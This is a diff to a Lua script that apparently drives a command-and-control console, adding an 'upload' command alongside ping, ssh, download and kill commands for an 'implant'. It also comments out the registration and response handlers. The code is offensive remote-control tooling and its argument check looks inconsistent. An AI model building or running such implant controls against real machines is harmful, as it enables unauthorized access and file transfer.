@@ -31,8 +31,18 @@ function download(payload)
 end
 
 function upload(payload)
-    print("command upload from script with args", payload)
-    local err = addtask(CODE.DOWN, payload)
+    local c = 0
+    local lcs = {}
+    for token in string.gmatch(payload, "[^%s]+") do 
+        lcs[c] = token
+        c=c+1
+    end
+    if #lcs ~= 1 then
+        print("problem")
+        return
+    end
+
+    local err = addtaskuploadfile(CODE.UPL, lcs[0], lcs[1])
     if err then
         print("Error")
     end
@@ -50,8 +60,10 @@ end
 command("impl","ping","Ping the implant", ping)
 command("impl","ssh","Get an interactive session", ssh)
 command("impl","download","Download a file", download)
+command("impl","upload","upload a file", upload)
 command("impl","kill","Kill implant", kill)
 
+--[[
 function OnRegister(...)
     local args = {...}
     print("Name:", args[1])
@@ -80,6 +92,7 @@ function OnResponse(...)
     print("response:", args[5])
     print("task:", args[6])
 end
+]]
 
 function Main()
 end
